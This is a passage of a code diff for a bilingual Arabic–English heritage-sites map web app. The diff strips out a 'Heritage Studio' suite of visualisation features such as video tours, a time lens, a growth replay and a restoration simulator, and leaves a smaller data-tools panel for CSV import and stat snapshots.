@@ -5295,21 +5295,21 @@ console.log('✓ XH advanced suite loaded — '+FEATURES.length+' features');
 })();
 </script>
 <style>
-/* ============ HERITAGE STUDIO UI ============ */
+/* ============ DATA TOOLS UI ============ */
 #dcFab{position:fixed;bottom:80px;inset-inline-start:16px;z-index:1150;display:flex;align-items:center;gap:8px;
   padding:11px 18px;border-radius:30px;background:linear-gradient(135deg,var(--plum),#4a1c38);color:#fff;
   font-family:var(--font-body);font-weight:700;font-size:13px;box-shadow:0 8px 26px rgba(110,42,83,.35);
   border:1px solid rgba(255,255,255,.18);transition:transform .2s,box-shadow .2s;cursor:pointer}
 #dcFab:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(110,42,83,.45)}
 body.view-dash #dcFab,body.view-list #dcFab{display:none}
-@media print{#dcFab,#dcOverlay,#stRecBar,#stReplayHud,#stStory,#stDual,#stLensHandle,#stVignette{display:none!important}}
+@media print{#dcFab,#dcOverlay{display:none!important}}
 @media (max-width:640px){#dcFab span{display:none}#dcFab{padding:12px;bottom:80px}}
 
 #dcOverlay{position:fixed;inset:0;background:rgba(10,25,32,.55);backdrop-filter:blur(4px);z-index:1600;
   display:none;align-items:center;justify-content:center;padding:20px}
 #dcOverlay.show{display:flex;animation:xhFade .22s}
 #dcPanel{background:var(--panel);color:var(--text);border-radius:20px;box-shadow:var(--shadow-lg);
-  width:min(720px,94vw);max-height:88vh;display:flex;flex-direction:column;overflow:hidden;
+  width:min(560px,94vw);max-height:88vh;display:flex;flex-direction:column;overflow:hidden;
   animation:xhPop .28s cubic-bezier(.2,.9,.3,1.2)}
 #dcHead{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;padding:20px 22px 14px;border-bottom:1px solid var(--border)}
 #dcTitle{font-family:var(--font-display);font-weight:700;font-size:19px}
@@ -5324,223 +5324,18 @@ body.view-dash #dcFab,body.view-list #dcFab{display:none}
 .dc-drop:hover,.dc-drop.over{border-color:var(--accent);background:var(--panel-2);color:var(--text)}
 .dc-drop b{font-size:13.5px;color:var(--text)}
 .dc-drop span{font-size:11.5px;max-width:360px}
-
-/* recording bar */
-#stRecBar{position:fixed;top:76px;left:50%;transform:translateX(-50%) translateY(-80px);z-index:1500;
-  display:flex;align-items:center;gap:14px;background:var(--panel);color:var(--text);padding:9px 12px 9px 18px;
-  border-radius:14px;box-shadow:var(--shadow-lg);font-size:13px;font-weight:600;transition:transform .35s;border:1px solid var(--border)}
-#stRecBar.show{transform:translateX(-50%) translateY(0)}
-.stRec-dot{width:11px;height:11px;border-radius:50%;background:#bd343b;animation:stBlink 1s infinite}
-@keyframes stBlink{0%,100%{opacity:1}50%{opacity:.25}}
-
-/* replay hud */
-#stReplayHud{position:fixed;top:90px;left:50%;transform:translateX(-50%) translateY(-40px);z-index:1490;
-  background:linear-gradient(135deg,rgba(17,50,65,.94),rgba(28,74,92,.94));color:#fff;padding:18px 34px;border-radius:18px;
-  box-shadow:0 18px 50px rgba(0,0,0,.4);text-align:center;opacity:0;pointer-events:none;transition:all .4s}
-#stReplayHud.show{opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto}
-#stReplayHud .stRp-num{font-family:var(--font-display);font-size:44px;font-weight:800;color:#f0c090;font-variant-numeric:tabular-nums;line-height:1.1}
-#stReplayHud .stRp-lbl{font-size:12px;color:#b8d2d6;margin-bottom:4px}
-#stReplayHud .stRp-reg{font-size:15px;font-weight:700;margin-bottom:10px;min-height:22px}
-
-/* time lens drag handle */
-#stLensHandle{position:absolute;display:none;border-radius:50%;cursor:grab;z-index:700;touch-action:none}
-#stLensHandle:active{cursor:grabbing}
-
-/* vintage mode */
-body.vintage-on #map canvas{filter:sepia(.68) saturate(.75) contrast(.92) brightness(.97)}
-#stVignette{position:absolute;inset:0;display:none;pointer-events:none;z-index:600;
-  background:radial-gradient(ellipse at center,transparent 55%,rgba(80,52,20,.28) 85%,rgba(56,34,12,.5) 100%);
-  box-shadow:inset 0 0 120px rgba(90,60,25,.35)}
-
-/* story mode */
-#stStory{position:fixed;inset:0;display:none;pointer-events:none;z-index:1300}
-#stStory.show{display:block}
-#stStoryCard{position:absolute;top:86px;inset-inline-end:22px;width:min(340px,86vw);pointer-events:auto;
-  background:var(--panel);color:var(--text);border-radius:18px;box-shadow:var(--shadow-lg);border:1px solid var(--border);
-  padding:20px;opacity:0;transform:translateY(14px);transition:all .5s cubic-bezier(.2,.8,.3,1)}
-#stStoryCard.in{opacity:1;transform:none}
-#stStoryCard .stc-k{font-size:11px;font-weight:700;letter-spacing:.5px;color:var(--amber);margin-bottom:6px}
-#stStoryCard h3{font-family:var(--font-display);font-size:18px;margin:0 0 8px;line-height:1.5}
-#stStoryCard p{font-size:12.5px;color:var(--text-soft);margin:4px 0;line-height:1.8}
-#stStoryCard .stc-hint{color:var(--accent);font-weight:600;margin-top:10px}
-#stStoryNav{position:absolute;bottom:24px;left:50%;transform:translateX(-50%);pointer-events:auto;
-  display:flex;align-items:center;gap:12px;background:var(--panel);border-radius:16px;padding:8px 14px;
-  box-shadow:var(--shadow-lg);border:1px solid var(--border);color:var(--text)}
-#stStoryNav button{font-family:inherit;cursor:pointer;color:var(--text)}
-#stStPrev,#stStNext{width:32px;height:32px;border-radius:10px;background:var(--panel-2);font-size:19px;font-weight:700}
-#stStExit{padding:7px 14px;border-radius:10px;background:var(--panel-2);font-size:12px;font-weight:700}
-#stStoryDots{display:flex;gap:6px}
-#stStoryDots span{width:9px;height:9px;border-radius:50%;background:var(--border);cursor:pointer;transition:all .2s}
-#stStoryDots span.on{background:var(--accent);transform:scale(1.25)}
-
-/* dual maps */
-#stDual{position:fixed;inset:0;background:var(--bg);z-index:1550;display:none;flex-direction:column}
-#stDual.show{display:flex}
-#stDualHead{display:flex;justify-content:space-between;align-items:center;padding:12px 18px;
-  background:var(--panel);border-bottom:1px solid var(--border);color:var(--text);font-size:14px}
-#stDualHead button{width:32px;height:32px;border-radius:10px;background:var(--panel-2);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer}
-#stDualBody{flex:1;display:grid;grid-template-columns:1fr 1fr;min-height:0}
-.stDual-side{display:flex;flex-direction:column;min-width:0;border-inline-end:1px solid var(--border)}
-.stDual-side:last-child{border-inline-end:none}
-.stDual-bar{display:flex;align-items:center;gap:10px;padding:8px 12px;background:var(--panel);border-bottom:1px solid var(--border)}
-.stDual-bar select{flex:1;padding:7px 10px;border-radius:9px;border:1px solid var(--border);background:var(--panel-2);color:var(--text);font-family:inherit;font-size:12.5px}
-.stDual-bar span{font-size:11.5px;color:var(--text-soft);white-space:nowrap}
-.stDual-map{flex:1;position:relative;min-height:0}
-@media (max-width:760px){#stDualBody{grid-template-columns:1fr;grid-template-rows:1fr 1fr}}
-
-/* what-if gauges */
-.stWiRow{display:flex;align-items:center;justify-content:center;gap:22px;margin:16px 0;flex-wrap:wrap}
-.stWiGauge{display:flex;flex-direction:column;align-items:center;gap:6px}
-.stWiGauge svg{width:110px;height:110px}
-.stWiGauge span{font-size:12px;color:var(--text-soft);font-weight:600}
-.stWiDelta{text-align:center;font-family:var(--font-display);font-weight:800;font-size:30px;line-height:1}
-.stWiDelta span{display:block;font-size:11px;font-family:var(--font-body);font-weight:600}
-.stWiDelta b{display:block;font-size:18px;opacity:.5}
-
-/* plaques (print) */
-.stPlq{width:100%;max-width:640px;margin:0 auto;text-align:center;padding:34px 30px;box-sizing:border-box;
-  border:2.5px solid #113241;border-radius:4px;position:relative;page-break-after:always;background:#fff;color:#15303a;
-  font-family:'IBM Plex Sans Arabic',sans-serif}
-.stPlq-band{height:9px;background:linear-gradient(90deg,#113241,#2f6f72,#f0c090);border-radius:3px;margin-bottom:22px}
-.stPlq-logo{height:52px;margin-bottom:10px}
-.stPlq-reg{font-size:12px;letter-spacing:1px;color:#6d7e84;margin-bottom:14px}
-.stPlq h2{font-family:'Reem Kufi',sans-serif;font-size:27px;color:#113241;margin:0 0 8px;line-height:1.5}
-.stPlq-loc{font-size:14px;color:#556;margin-bottom:14px}
-.stPlq-cls{display:inline-block;color:#fff;font-weight:700;font-size:13px;padding:6px 18px;border-radius:20px;margin-bottom:20px}
-.stPlq-qr{width:170px;height:170px;display:block;margin:0 auto 10px}
-.stPlq-code{font-size:13px;font-weight:700;color:#113241;margin-bottom:10px}
-.stPlq-foot{font-size:11px;color:#8a99a0;border-top:1px solid #e3ddd2;padding-top:12px}
-.stStkGrid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
-.stStk{border:1.5px dashed #9bb0b6;border-radius:10px;padding:14px;text-align:center;page-break-inside:avoid;background:#fff;color:#15303a}
-.stStk img{width:110px;height:110px;display:block;margin:0 auto 8px}
-.stStk b{display:block;font-size:12px;margin-bottom:3px;line-height:1.5}
-.stStk span{font-size:10.5px;color:#8a99a0}
 </style>
 <script>
 /* ============================================================
-   HERITAGE STUDIO — استوديو التراث
-   Creative & data suite: tour video recorder, time lens, growth
-   replay, restoration what-if, village stories, vintage map,
-   field plaques, temporal heat, dual synced maps + the kept
-   Smart Importer and Time Machine.
+   DATA TOOLS — أدوات البيانات
+   Smart CSV Importer + Time Machine (stat snapshots).
    ============================================================ */
 (function(){
 'use strict';
-try{ if(!DB || !DB.sites || !map){ console.warn('Studio: core not ready'); return; } }catch(e){ return; }
+try{ if(!DB || !DB.sites || !map){ console.warn('DataTools: core not ready'); return; } }catch(e){ return; }
 
 const L=(ar,en)=>(typeof LANG!=='undefined'&&LANG==='en')?en:ar;
 const el=(tag,cls,html)=>{const e=document.createElement(tag);if(cls)e.className=cls;if(html!=null)e.innerHTML=html;return e;};
-const decayColor=d=>d==null?'#9bb0b6':d<0.2?'#7fb9bb':d<0.35?'#f59e41':d<0.5?'#e95345':'#bd343b';
-const siteName=s=>(typeof nm==='function')?nm(s):s[1];
-
-/* ---------- studio-level extra filter hook ---------- */
-let _studioAgeMin=null;
-(function(){
-  const _p=passes;
-  passes=function(s){ if(!_p(s))return false; if(_studioAgeMin!=null && (s[9]==null||s[9]<_studioAgeMin))return false; return true; };
-})();
-
-/* ---------- own village index (suite1's is private) ---------- */
-let _stVillages=null;
-function stVillages(){
-  if(_stVillages)return _stVillages;
-  const g={};
-  for(let i=0;i<DB.sites.length;i++){
-    const s=DB.sites[i];
-    const m=s[1].match(/قرية\s+([^\d]+?)\s+التراثية/);
-    if(!m)continue;
-    const name='قرية '+m[1].trim();
-    let v=g[name];
-    if(!v)v=g[name]={name,idxs:[],lat:0,lng:0,dSum:0,dN:0,reg:s[4],gov:s[5]};
-    v.idxs.push(i); v.lat+=s[2]; v.lng+=s[3];
-    if(s[10]!=null){v.dSum+=s[10];v.dN++;}
-  }
-  _stVillages=Object.values(g).filter(v=>v.idxs.length>=4).map(v=>{
-    v.lat/=v.idxs.length; v.lng/=v.idxs.length;
-    v.avgDecay=v.dN?Math.round(v.dSum/v.dN*100):null;
-    return v;
-  }).sort((a,b)=>b.idxs.length-a.idxs.length);
-  return _stVillages;
-}
-function stVName(v){ return (LANG==='en'&&typeof trDictVal==='function')?trDictVal(v.name):v.name; }
-
-/* ---------- canvas overlay hook (lens + tour caption) ---------- */
-const ST={lens:null, caption:null};
-(function(){
-  const _r=map._render.bind(map);
-  map._render=function(){ _r(); try{ stDraw(); }catch(e){} };
-})();
-function projectedDecay(s,year){
-  const d0=s[10]!=null?s[10]:0.25;
-  const rate=(s[10]!=null&&s[9]>0)?Math.min(0.03,Math.max(0.002,s[10]/s[9])):0.004;
-  return Math.min(1,d0+rate*(year-2026));
-}
-function stDraw(){
-  const ctx=map.ctx;
-  /* --- time lens --- */
-  if(ST.lens){
-    const {x,y,r,year}=ST.lens;
-    ctx.save();
-    ctx.beginPath(); ctx.arc(x,y,r,0,Math.PI*2); ctx.clip();
-    ctx.fillStyle='rgba(13,29,36,.32)'; ctx.fillRect(x-r,y-r,r*2,r*2);
-    // redraw points inside lens with projected colors
-    const pts=map.points, BX=map._baseX, BY=map._baseY;
-    if(pts&&pts.length&&BX){
-      const z=map.z, zi=Math.round(z), scale=Math.pow(2,z-zi), pw=Math.pow(2,zi);
-      const TILE=256, d2r=Math.PI/180;
-      const cx=(map.center[1]+180)/360*TILE*pw;
-      const s0=Math.sin(map.center[0]*d2r), cy=(0.5-Math.log((1+s0)/(1-s0))/(4*Math.PI))*TILE*pw;
-      const ox=cx-map.w/2/scale, oy=cy-map.h/2/scale, hw=map.w/2, hh=map.h/2;
-      let drawn=0;
-      for(let i=0;i<pts.length && drawn<5000;i++){
-        const px=((BX[i]*pw-ox)-hw)*scale+hw; if(px<x-r-8||px>x+r+8)continue;
-        const py=((BY[i]*pw-oy)-hh)*scale+hh; if(py<y-r-8||py>y+r+8)continue;
-        if((px-x)*(px-x)+(py-y)*(py-y)>r*r)continue;
-        const idx=pts[i].data&&pts[i].data.idx;
-        const s=DB.sites[idx]; if(!s)continue;
-        ctx.beginPath(); ctx.arc(px,py,4.5,0,Math.PI*2);
-        ctx.fillStyle=decayColor(projectedDecay(s,year)); ctx.fill();
-        ctx.lineWidth=1.2; ctx.strokeStyle='rgba(255,255,255,.85)'; ctx.stroke();
-        drawn++;
-      }
-    }
-    ctx.restore();
-    // ring + label
-    ctx.save();
-    ctx.beginPath(); ctx.arc(x,y,r,0,Math.PI*2);
-    ctx.lineWidth=3.5; ctx.strokeStyle='#f0c090'; ctx.stroke();
-    ctx.beginPath(); ctx.arc(x,y,r+5,0,Math.PI*2);
-    ctx.lineWidth=1.2; ctx.strokeStyle='rgba(240,192,144,.5)'; ctx.stroke();
-    const lbl=' '+num(year)+' ';
-    ctx.font='700 13px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
-    const tw=ctx.measureText(lbl).width+18;
-    ctx.fillStyle='#113241'; ctx.beginPath();
-    ctx.roundRect ? ctx.roundRect(x-tw/2,y-r-26,tw,22,11) : ctx.rect(x-tw/2,y-r-26,tw,22); ctx.fill();
-    ctx.fillStyle='#f0c090'; ctx.textAlign='center'; ctx.textBaseline='middle';
-    ctx.fillText(lbl,x,y-r-15);
-    ctx.restore();
-  }
-  /* --- tour caption (baked into recorded video) --- */
-  if(ST.caption){
-    const c=ST.caption;
-    ctx.save();
-    ctx.textAlign='center';
-    const yb=map.h-64;
-    ctx.font='700 20px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
-    const w=Math.max(ctx.measureText(c.title).width, 200)+56;
-    ctx.fillStyle='rgba(13,29,36,.82)';
-    ctx.beginPath();
-    ctx.roundRect ? ctx.roundRect(map.w/2-w/2,yb-26,w,58,14) : ctx.rect(map.w/2-w/2,yb-26,w,58);
-    ctx.fill();
-    ctx.strokeStyle='rgba(240,192,144,.55)'; ctx.lineWidth=1.4; ctx.stroke();
-    ctx.fillStyle='#fff'; ctx.textBaseline='middle';
-    ctx.fillText(c.title,map.w/2,yb-3);
-    ctx.font='500 12px "IBM Plex Sans Arabic",sans-serif';
-    ctx.fillStyle='#b8d2d6';
-    ctx.fillText(c.sub||'',map.w/2,yb+18);
-    ctx.restore();
-  }
-}
 
 /* ---------- generic modal ---------- */
 let _dcOnClose=null;
@@ -5560,20 +5355,11 @@ function dcClose(){
 
 /* ---------- feature registry ---------- */
 const FEATURES2=[
- {id:'record',  ic:'🎬', ar:'تسجيل الجولة كفيديو',   en:'Record tour as video', dar:'فيديو WebM حقيقي للطيران بين القرى',      den:'A real downloadable flyover video'},
- {id:'lens',    ic:'🔮', ar:'عدسة الزمن',            en:'Time lens',            dar:'داخل العدسة ٢٠٤٦ وخارجها اليوم',           den:'Inside: 2046 · outside: today'},
- {id:'replay',  ic:'⏮️', ar:'إعادة تشغيل النمو',     en:'Growth replay',        dar:'شاهد السجل يمتلئ من صفر إلى ٢٠,٨٠٠',       den:'Watch the register fill 0 → 20,800'},
- {id:'whatif',  ic:'🧪', ar:'محاكي «ماذا لو رمّمنا؟»',en:'Restoration what-if',  dar:'كم يقفز المؤشر الوطني لو رمّمنا؟',         den:'How much does the index jump?'},
- {id:'story',   ic:'📖', ar:'قصص القرى التفاعلية',   en:'Village stories',      dar:'رحلة سردية فصولها مبانٍ حقيقية',           den:'A scrollytelling journey per village'},
- {id:'vintage', ic:'🗺️', ar:'الخريطة العتيقة',       en:'Vintage map',          dar:'طراز مخطوطة قديمة بضغطة زر',               den:'Old-manuscript map skin'},
- {id:'plaques', ic:'🏷️', ar:'اللوحات التعريفية',     en:'Field plaques',        dar:'لوحات وملصقات QR جاهزة للطباعة',           den:'Print-ready QR plaques & labels'},
- {id:'theat',   ic:'🔥', ar:'الحرارة عبر الزمن',     en:'Temporal heat map',    dar:'كثافة المواقع تتشكل حسب العمر',            den:'Density blooming through the ages'},
- {id:'dual',    ic:'🆚', ar:'خريطتان متزامنتان',     en:'Dual synced maps',     dar:'قارن منطقتين جنباً إلى جنب',               den:'Compare two regions side-by-side'},
- {id:'import',  ic:'📥', ar:'الاستيراد الذكي',       en:'Smart importer',       dar:'استورد مواقع من CSV بضغطة واحدة',          den:'Import sites from CSV in one click'},
- {id:'timemachine',ic:'🕰️', ar:'آلة الزمن',          en:'Time machine',         dar:'لقطات مؤشرات وتغيّر عبر الزمن',            den:'Stat snapshots over time'},
+ {id:'import',     ic:'📥', ar:'الاستيراد الذكي',       en:'Smart importer',       dar:'استورد مواقع من CSV بضغطة واحدة',          den:'Import sites from CSV in one click'},
+ {id:'timemachine', ic:'🕰️', ar:'آلة الزمن',            en:'Time machine',         dar:'لقطات مؤشرات وتغيّر عبر الزمن',            den:'Stat snapshots over time'},
 ];
 function openDrawer2(){
-  const b=dcOpen(L('استوديو التراث','Heritage Studio'),L('أدوات إبداعية وعملية تنقل المنصة لمستوى آخر','Creative & practical tools that take the platform further'));
+  const b=dcOpen(L('أدوات البيانات','Data tools'),L('استيراد سريع للمواقع الجديدة، ومتابعة تطوّر السجل عبر الزمن','Fast bulk import, and tracking the register over time'));
   const grid=el('div','xh-grid');
   FEATURES2.forEach(f=>{
     const c=el('button','xh-card',`<span class="xh-ic">${f.ic}</span><b>${L(f.ar,f.en)}</b><span class="xh-d">${L(f.dar,f.den)}</span>`);
@@ -5584,477 +5370,7 @@ function openDrawer2(){
 }
 
 /* ============================================================
-   1) TOUR VIDEO RECORDER
-   ============================================================ */
-let _recState=null;
-function startRecording(){
-  if(_recState){ stopRecording(); return; }
-  if(!map.canvas.captureStream || typeof MediaRecorder==='undefined'){
-    toast(L('المتصفح لا يدعم تسجيل الفيديو','This browser does not support video recording')); return;
-  }
-  const vs=stVillages().slice(0,10);
-  if(!vs.length){ toast(L('لا توجد قرى كافية','Not enough villages')); return; }
-  dcClose(); setView('map');
-  let rec, chunks=[];
-  try{
-    const stream=map.canvas.captureStream(30);
-    let mime='video/webm;codecs=vp9';
-    if(!MediaRecorder.isTypeSupported(mime)) mime='video/webm';
-    rec=new MediaRecorder(stream,{mimeType:mime,videoBitsPerSecond:5_000_000});
-  }catch(err){ toast(L('تعذّر بدء التسجيل','Could not start recording')); return; }
-  rec.ondataavailable=e=>{ if(e.data&&e.data.size)chunks.push(e.data); };
-  rec.onstop=()=>{
-    const blob=new Blob(chunks,{type:'video/webm'});
-    if(blob.size>1000){
-      const a=document.createElement('a');
-      a.href=URL.createObjectURL(blob); a.download='heritage_tour.webm'; a.click();
-      toast(L('✓ تم حفظ الفيديو — شاهده أو شاركه مباشرة','✓ Video saved — watch or share it'));
-    } else toast(L('التسجيل كان قصيراً جداً','Recording too short'));
-  };
-  _recState={rec,step:0,timer:null,vs};
-  rec.start(1000);
-  $('stRecBar').classList.add('show');
-  const tick=()=>{
-    if(!_recState)return;
-    const secs=Math.round((Date.now()-_recState.t0)/1000);
-    $('stRecTime').textContent=num(Math.floor(secs/60))+':'+String(secs%60).padStart(2,'0');
-  };
-  _recState.t0=Date.now();
-  _recState.clock=setInterval(tick,500);
-  recStep();
-}
-function recStep(){
-  if(!_recState)return;
-  const {vs}=_recState;
-  if(_recState.step>=vs.length){ stopRecording(); return; }
-  const v=vs[_recState.step];
-  map.flyTo([v.lat,v.lng],12.5,2600);
-  ST.caption={title:stVName(v), sub:`${DB.govs[v.gov]} · ${DB.regions[v.reg]} — ${num(v.idxs.length)} ${L('مبنى تراثي','heritage buildings')}`};
-  map.invalidate();
-  _recState.step++;
-  _recState.timer=setTimeout(recStep,6200);
-}
-function stopRecording(){
-  if(!_recState)return;
-  clearTimeout(_recState.timer); clearInterval(_recState.clock);
-  try{ _recState.rec.stop(); }catch(e){}
-  _recState=null;
-  ST.caption=null; map.invalidate();
-  $('stRecBar').classList.remove('show');
-}
-
-/* ============================================================
-   2) TIME LENS
-   ============================================================ */
-function toggleLens(){
-  if(ST.lens){ closeLens(); toast(L('تم إغلاق عدسة الزمن','Time lens closed')); dcClose(); return; }
-  dcClose(); setView('map');
-  const r=Math.min(map.w,map.h)*0.22||130;
-  ST.lens={x:map.w/2,y:map.h/2,r:Math.max(90,Math.min(170,r)),year:2046};
-  // drag handle
-  let h=$('stLensHandle');
-  if(!h){
-    h=el('div',null,''); h.id='stLensHandle';
-    map.el.appendChild(h);
-    let dragging=false,ox=0,oy=0;
-    const down=e=>{ dragging=true; const p=e.touches?e.touches[0]:e; ox=p.clientX; oy=p.clientY; e.preventDefault(); e.stopPropagation(); };
-    const move=e=>{ if(!dragging||!ST.lens)return; const p=e.touches?e.touches[0]:e;
-      ST.lens.x+=p.clientX-ox; ST.lens.y+=p.clientY-oy; ox=p.clientX; oy=p.clientY;
-      positionLensHandle(); map.invalidate(); e.preventDefault(); };
-    const up=()=>{ dragging=false; };
-    h.addEventListener('mousedown',down); window.addEventListener('mousemove',move); window.addEventListener('mouseup',up);
-    h.addEventListener('touchstart',down,{passive:false}); window.addEventListener('touchmove',move,{passive:false}); window.addEventListener('touchend',up);
-  }
-  h.style.display='block';
-  positionLensHandle();
-  map.invalidate();
-  toast(L('🔮 اسحب العدسة فوق أي منطقة — داخلها ترى ٢٠٤٦','🔮 Drag the lens — inside it you see 2046'));
-}
-function positionLensHandle(){
-  const h=$('stLensHandle'); if(!h||!ST.lens)return;
-  h.style.left=(ST.lens.x-ST.lens.r)+'px';
-  h.style.top=(ST.lens.y-ST.lens.r)+'px';
-  h.style.width=h.style.height=(ST.lens.r*2)+'px';
-}
-function closeLens(){
-  ST.lens=null;
-  const h=$('stLensHandle'); if(h)h.style.display='none';
-  map.invalidate();
-}
-
-/* ============================================================
-   3) GROWTH REPLAY
-   ============================================================ */
-let _replayOn=false,_replayRAF=null;
-function startReplay(){
-  if(_replayOn){ stopReplay(); return; }
-  dcClose(); setView('map');
-  // order: regions by count desc, sites grouped per region
-  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
-  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
-  const ordered=[];
-  for(const ri of regOrder) for(let i=0;i<DB.sites.length;i++){ const s=DB.sites[i]; if(s[4]===ri) ordered.push({s,i,ri}); }
-  const pts=ordered.map(o=>({lat:o.s[2],lng:o.s[3],color:clsColor(o.s[6]),zone:DB.types[o.s[7]]==='منطقة',data:{idx:o.i,lat:o.s[2],lng:o.s[3]}}));
-  _replayOn=true;
-  map.closePopup(); map.fitBounds(SA,0.05);
-  $('stReplayHud').classList.add('show');
-  const total=pts.length, durMs=22000, t0=performance.now();
-  let lastK=0;
-  const step=now=>{
-    if(!_replayOn)return;
-    const p=Math.min(1,(now-t0)/durMs);
-    const eased=p<0.5 ? 2*p*p : 1-Math.pow(-2*p+2,2)/2;
-    const k=Math.max(1,Math.round(total*eased));
-    if(k!==lastK){
-      map.setPoints(pts.slice(0,k));
-      lastK=k;
-      $('stReplayCount').textContent=num(k);
-      const cur=ordered[Math.min(k,total)-1];
-      $('stReplayRegion').textContent=DB.regions[cur.ri];
-    }
-    if(p<1)_replayRAF=requestAnimationFrame(step);
-    else{
-      $('stReplayRegion').textContent=L('السجل الوطني مكتمل ✓','National register complete ✓');
-      setTimeout(stopReplay,2600);
-    }
-  };
-  _replayRAF=requestAnimationFrame(step);
-}
-function stopReplay(){
-  if(!_replayOn)return;
-  _replayOn=false; cancelAnimationFrame(_replayRAF);
-  $('stReplayHud').classList.remove('show');
-  render();
-}
-
-/* ============================================================
-   4) RESTORATION WHAT-IF
-   ============================================================ */
-function healthOf(list,simSet){
-  let dS=0,dN=0,urg=0;
-  for(const s of list){
-    let d=s[10];
-    if(simSet&&simSet.has(s[0])) d=0.1;
-    if(d!=null){ dS+=d; dN++; if(d>=0.5)urg++; }
-  }
-  const avg=dN?dS/dN:0.3, urgP=dN?urg/dN:0;
-  const raw=Math.max(0,Math.min(100,100-(avg*100*0.7+urgP*100*0.3)));
-  return { score:Math.round(raw), raw, urgent:urg };
-}
-function openWhatIf(){
-  const b=dcOpen(L('محاكي «ماذا لو رمّمنا؟»','Restoration what-if simulator'),L('اختر نطاق ترميم افتراضي وشاهد أثره الفوري على مؤشر صحة التراث الوطني','Pick a hypothetical restoration scope and watch the national index respond'));
-  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
-  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
-  b.innerHTML=`
-    <div class="xh-chips">
-      <button class="xh-chip sel" data-scope="top100">${L('أعلى ١٠٠ موقع خطورة','Top 100 risky')}</button>
-      <button class="xh-chip" data-scope="filter">${L('كل الفلتر الحالي','Entire current filter')}</button>
-      <button class="xh-chip" data-scope="region">${L('منطقة كاملة:','Whole region:')}</button>
-      <select id="stWiRegion" class="xh-in" style="width:auto;padding:6px 10px">${regOrder.map(ri=>`<option value="${ri}">${DB.regions[ri]}</option>`).join('')}</select>
-    </div>
-    <div id="stWiResult"></div>
-    <div class="xh-actionrow"><button class="xh-btn ghost" id="stWiShow">👁 ${L('أظهر الأثر على الخريطة ٥ ثوانٍ','Show effect on map for 5s')}</button></div>
-    <div class="xh-note">${L('الترميم الافتراضي = خفض تهدّم المواقع المختارة إلى ١٠٪. المؤشر الوطني يُحسب على كامل السجل.','Hypothetical restoration = selected sites decay drops to 10%. Index computed over the full register.')}</div>`;
-  let scope='top100', lastSet=null;
-  const gauge=(score,label,color)=>{
-    const C=2*Math.PI*15.9155;
-    return `<div class="stWiGauge"><svg viewBox="0 0 42 42">
-      <circle cx="21" cy="21" r="15.9155" fill="none" stroke="var(--panel-2)" stroke-width="4.5"/>
-      <circle cx="21" cy="21" r="15.9155" fill="none" stroke="${color}" stroke-width="4.5" stroke-linecap="round"
-        stroke-dasharray="${(score/100*C).toFixed(1)} ${C}" transform="rotate(-90 21 21)"/>
-      <text x="21" y="23.5" text-anchor="middle" font-size="10.5" font-weight="800" fill="${color}" font-family="Reem Kufi">${num(score)}</text>
-    </svg><span>${label}</span></div>`;
-  };
-  const compute=()=>{
-    let chosen;
-    if(scope==='top100'){
-      chosen=DB.sites.filter(s=>passes(s)).map(s=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,100).map(o=>o.s);
-    } else if(scope==='filter'){
-      chosen=DB.sites.filter(passes);
-    } else {
-      const ri=+$('stWiRegion').value;
-      chosen=DB.sites.filter(s=>s[4]===ri);
-    }
-    const simSet=new Set(chosen.map(s=>s[0]));
-    lastSet=simSet;
-    const before=healthOf(DB.sites,null);
-    const after=healthOf(DB.sites,simSet);
-    const deltaRaw=after.raw-before.raw;
-    const deltaTxt=Math.abs(deltaRaw)>=1?(deltaRaw>0?'+':'')+num(Math.round(deltaRaw)):(deltaRaw>0?'+':'')+deltaRaw.toFixed(1);
-    const dc2=deltaRaw>0?'#2f6f72':'#9bb0b6';
-    $('stWiResult').innerHTML=`
-      <div class="stWiRow">
-        ${gauge(before.score,L('اليوم','Today'),'#9bb0b6')}
-        <div class="stWiDelta" style="color:${dc2}">${deltaTxt}<span>${L('نقطة','pts')}</span><b>⟵</b></div>
-        ${gauge(after.score,L('بعد الترميم','After restoration'),'#2f6f72')}
-      </div>
-      <div class="xh-kpirow">
-        <div class="xh-kpi"><b>${num(simSet.size)}</b><span>${L('موقع في خطة الترميم','sites in the plan')}</span></div>
-        <div class="xh-kpi"><b style="color:#2f6f72">−${num(before.urgent-after.urgent)}</b><span>${L('مواقع تخرج من قائمة الملحّة','sites leave the urgent list')}</span></div>
-      </div>`;
-  };
-  b.querySelectorAll('[data-scope]').forEach(c=>c.onclick=()=>{
-    b.querySelectorAll('[data-scope]').forEach(x=>x.classList.remove('sel'));
-    c.classList.add('sel'); scope=c.dataset.scope; compute();
-  });
-  $('stWiRegion').onchange=()=>{ if(scope==='region')compute(); };
-  $('stWiShow').onclick=()=>{
-    if(!lastSet)return;
-    dcClose(); setView('map');
-    const pts=[];
-    for(let i=0;i<DB.sites.length;i++){
-      const s=DB.sites[i]; if(!passes(s))continue;
-      const restored=lastSet.has(s[0]);
-      pts.push({lat:s[2],lng:s[3],color:restored?'#2f6f72':clsColor(s[6]),zone:DB.types[s[7]]==='منطقة',data:{idx:i,lat:s[2],lng:s[3]}});
-    }
-    map.setPoints(pts);
-    toast(L('المواقع الخضراء = خطة الترميم الافتراضية','Green sites = the hypothetical plan'));
-    setTimeout(()=>render(),5000);
-  };
-  compute();
-}
-
-/* ============================================================
-   5) VILLAGE STORIES (scrollytelling)
-   ============================================================ */
-let _storyState=null;
-function openStories(){
-  const vs=stVillages();
-  const b=dcOpen(L('قصص القرى التفاعلية','Interactive village stories'),L('اختر قرية — وستتحول لرحلة سردية فصولها مبانٍ حقيقية على الخريطة','Pick a village — it becomes a guided narrative over the map'));
-  b.innerHTML=`<input class="xh-in" id="stStSearch" placeholder="${L('ابحث عن قرية…','Search villages…')}" style="margin-bottom:12px">
-    <div class="xh-rows" id="stStList"></div>`;
-  const renderList=q=>{
